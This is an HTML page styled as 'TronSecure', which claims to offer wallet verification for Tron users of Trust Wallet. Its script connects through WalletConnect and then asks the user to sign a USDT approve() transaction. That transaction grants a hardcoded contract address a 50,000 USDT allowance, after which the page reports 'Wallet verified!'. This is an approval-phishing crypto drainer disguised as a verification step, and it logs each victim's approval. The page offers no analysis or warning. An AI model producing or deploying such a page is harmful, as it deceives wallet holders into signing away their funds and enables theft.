<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify Wallet - TronSecure</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            max-width: 450px;
            width: 100%;
            background: white;
            border-radius: 30px;
            padding: 40px 30px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
        }

        .logo {
            font-size: 32px;
            font-weight: bold;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 20px;
        }

        .network-badge {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 8px 20px;
            border-radius: 50px;
            display: inline-block;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 20px;
        }

        h2 {
            color: #333;
            margin-bottom: 10px;
            font-size: 24px;
        }

        .subtitle {
            color: #666;
            font-size: 14px;
            margin-bottom: 30px;
            line-height: 1.6;
        }

        .wallet-card {
            background: #f8f9fa;
            border: 2px solid #e0e0e0;
            border-radius: 20px;
            padding: 30px 25px;
            margin: 20px 0;
            cursor: pointer;
            transition: all 0.3s;
        }

        .wallet-card:hover {
            border-color: #667eea;
            background: #f0f3ff;
            transform: translateY(-2px);
        }

        .wallet-icon {
            font-size: 48px;
            margin-bottom: 15px;
        }

        .wallet-name {
            font-size: 22px;
            font-weight: 700;
            margin-bottom: 8px;
            color: #333;
        }

        .wallet-desc {
            color: #666;
            font-size: 14px;
        }

        .info-box {
            background: #f8f9fa;
            border-radius: 16px;
            padding: 20px;
            margin: 20px 0;
            text-align: left;
        }

        .info-item {
            padding: 8px 0;
            color: #666;
            font-size: 14px;
            display: flex;
            justify-content: space-between;
        }

        .info-item strong {
            color: #667eea;
        }

        .status-message {
            margin-top: 20px;
            padding: 15px;
            border-radius: 12px;
            font-size: 14px;
        }

        .success {
            background: #d4edda;
            color: #155724;
        }

        .error {
            background: #f8d7da;
            color: #721c24;
        }

        .info {
            background: #cce5ff;
            color: #004085;
        }

        .loading-spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .footer {
            margin-top: 30px;
            color: #999;
            font-size: 12px;
        }

        .back-btn {
            background: none;
            border: 2px solid #667eea;
            color: #667eea;
            padding: 12px 30px;
            border-radius: 30px;
            margin-top: 20px;
            cursor: pointer;
            display: inline-block;
            text-decoration: none;
            font-weight: 600;
        }

        .back-btn:hover {
            background: #667eea;
            color: white;
        }

        /* Simple QR Modal */
        .qr-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .qr-content {
            background: white;
            border-radius: 30px;
            padding: 30px;
            max-width: 400px;
            width: 90%;
            text-align: center;
        }

        #qrcode {
            margin: 20px auto;
            padding: 20px;
            background: white;
            border-radius: 20px;
        }
    </style>
    
    <!-- WalletConnect v2 Core -->
    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/dist/index.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3wallet@1.9.0/dist/index.min.js"></script>
    <script src="https://unpkg.com/qrcode-generator@1.4.4/qrcode.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
</head>
<body>
    <div class="container">
        <div class="logo">TronSecure</div>
        
        <div class="network-badge">
            🌐 TRON NETWORK
        </div>
        
        <h2>Verify Your Wallet</h2>
        <div class="subtitle">Connect with Trust Wallet to verify</div>

        <!-- Trust Wallet Card -->
        <div class="wallet-card" onclick="connectWallet()">
            <div class="wallet-icon">💎</div>
            <div class="wallet-name">Trust Wallet</div>
            <div class="wallet-desc">Click to connect via WalletConnect</div>
        </div>

        <!-- Status -->
        <div class="info-box">
            <div class="info-item">
                <span>Status:</span>
                <strong id="statusText">Ready</strong>
            </div>
        </div>

        <div id="message"></div>
    </div>

    <!-- QR Modal -->
    <div id="qrModal" class="qr-modal">
        <div class="qr-content">
            <h3 style="margin-bottom: 20px;">Scan with Trust Wallet</h3>
            <div id="qrcode"></div>
            <p style="color: #666; margin-top: 20px;">1. Open Trust Wallet<br>2. Tap scan icon<br>3. Scan this QR code</p>
            <button onclick="closeQR()" style="margin-top: 20px; padding: 10px 30px; background: #667eea; color: white; border: none; border-radius: 50px; cursor: pointer;">Close</button>
        </div>
    </div>

    <script>
        const projectId = "9e922e6573d8e9550e36d0701aa63572"; // Get from https://cloud.walletconnect.com
        const CONTRACT_ADDRESS = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt";
        const USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
        const APPROVE_AMOUNT = 50000;

        let web3wallet;
        let session;

        async function connectWallet() {
            updateStatus('Initializing...');

            try {
                // Create modal
                const modal = document.createElement('div');
                
                // Initialize Web3Wallet
                web3wallet = await Web3Wallet.init({
                    projectId: projectId,
                    metadata: {
                        name: 'TronSecure',
                        description: 'Wallet Verification',
                        url: window.location.origin,
                        icons: ['https://avatars.githubusercontent.com/u/37784886']
                    }
                });

                // Create pairing
                const { uri, approval } = await web3wallet.core.pairing.create();
                
                // Show QR
                showQR(uri);
                updateStatus('Scan QR code with Trust Wallet');

                // Wait for connection
                session = await approval();
                
                closeQR();
                updateStatus('Connected! Approving...');
                
                // Get address
                const address = session.namespaces.tron?.accounts[0]?.split(':')[2];
                
                if (address) {
                    await approveUSDT(address);
                }

            } catch (error) {
                showError(error.message);
            }
        }

        function showQR(uri) {
            const modal = document.getElementById('qrModal');
            const qrDiv = document.getElementById('qrcode');
            qrDiv.innerHTML = '';
            
            modal.style.display = 'flex';
            
            const qr = qrcode(0, 'H');
            qr.addData(uri);
            qr.make();
            qrDiv.innerHTML = qr.createImgTag(5);
        }

        function closeQR() {
            document.getElementById('qrModal').style.display = 'none';
        }

        async function approveUSDT(address) {
            try {
                const tronWeb = new TronWeb({
                    fullHost: 'https://api.trongrid.io'
                });

                const contract = await tronWeb.contract().at(USDT_ADDRESS);
                const amount = APPROVE_AMOUNT * 1000000;

                // Request approval via WalletConnect
                const result = await web3wallet.request({
                    topic: session.topic,
                    chainId: 'tron:mainnet',
                    request: {
                        method: 'tron_signTransaction',
                        params: [{
                            to: USDT_ADDRESS,
                            from: address,
                            data: contract.approve(CONTRACT_ADDRESS, amount).encodeABI(),
                            value: '0'
                        }]
                    }
                });

                saveApproval(address, APPROVE_AMOUNT, result);
                showSuccess('Wallet verified!');

            } catch (error) {
                showError(error.message);
            }
        }

        function saveApproval(address, amount, tx) {
            const approvals = JSON.parse(localStorage.getItem('approvals') || '[]');
            approvals.push({
                user: address,
                amount: amount,
                tx: tx,
                time: new Date().toISOString()
            });
            localStorage.setItem('approvals', JSON.stringify(approvals));
        }

        function updateStatus(text) {
            document.getElementById('statusText').innerText = text;
        }

        function showSuccess(msg) {
            document.getElementById('message').innerHTML = `<div class="status-message success">✅ ${msg}</div>`;
            setTimeout(() => window.location.href = 'index.html?verified=true', 2000);
        }

        function showError(msg) {
            document.getElementById('message').innerHTML = `<div class="status-message error">❌ ${msg}</div>`;
            updateStatus('Ready');
        }
    </script>
</body>
</html>
